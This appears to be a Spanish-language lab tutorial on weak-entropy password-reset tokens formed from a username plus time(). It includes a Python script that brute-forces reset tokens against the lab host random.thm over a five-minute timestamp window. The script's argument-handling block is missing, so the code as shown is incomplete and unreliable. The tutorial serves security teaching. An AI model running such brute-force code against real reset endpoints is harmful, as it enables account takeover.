Esta técnica cubrirá un escenario donde una generación de número random sufre de entropía pobre o insuficiente. Cuando esto pasa, los valores generados no son verdaderamente aleatorios y se vuelven vulnerables a ataques.

Por ejemplo, si una clave de encriptación se genera usando información de baja entropía, como `timestamp`, un atacante podría usar esa información predecible para reducir la complejidad de encontrar la clave. De forma similar, las fuentes de baja entropía, como `relojes del sistema` o `inputs predecibles de usuarios`, pueden llevar a aleatoriedad débil en aplicaciones.

<h2>Explotación</h2>
- Un atacante puede explotar la vulnerabilidad de falta de entropía en el token de reseteo visitando el siguiente link de reseteo: `http://random.thm:8090/case/reset_password.php?token={Username}{timestamp_of_token_generation}`.
- Como el token es generado concatenando el nombre de usuario con el resultado de la función `time()`, el atacante conoce que el valor `time()` representa el timestamp cuando el link de reseteo fue creado. Con este conocimiento, el atacante puede realizar ataques de fuerza bruta para adivinar el timestamp con valores cercanos.
- Debajo tienes un script de Python que acepta un argumento para el username y otro para el timestamp. En esta [página](https://www.unixtimestamp.com/) puedes obtener tu Unix Timestamp.
- Además, puedes ajustar el rango de tiempo con el que probar cambiando el `-300` (-5 minutos) por cualquier otro valor.

```python
import requests
import sys

# Function to brute force the reset token
def brute_force_token(username, start_timestamp):
    url = "http://random.thm:8090/case/reset_password.php"
    
    # Try tokens within a range of -5 minutes
    for i in range(-300, 0):
        current_timestamp = start_timestamp + i
        token = f"{username}{current_timestamp}"
        params = {'token': token}
        
        response = requests.get(url, params=params)
        
        # Check if the token is valid
        if "Invalid or expired token." not in response.text:
            print(f"Correct token identified: {token}")
            return token
        else:
            print(f"Tried token: {token} (Invalid)")
    
    print("No valid token found in the given range.")
    return None

if len(sys.argv) != 3:

brute_force_token(username, start_timestamp)
```

<h3>¿Por qué es Débil el Token?</h3>
- **Entropía Débil en la Generación de Tokens:** En este caso, el sistema confía en fuentes de baja entropía (`username` y `timestamp`), los cuales hacen el token predecible. Los tokens de alta entropía están generados usando generadores de números random seguros (como `random_bytes()`).
- **Espacio de Búsqueda Pequeño:** Un espacio de búsqueda se refiere al número total de posibles valores del token. En este caso, debido a que la función `time()` se actualiza cada segundo, el espacio para hacerle fuerza bruta al token es muy pequeño. Un atacante podría simplemente adivinar todos los timestamps posibles en un pequeño rango.
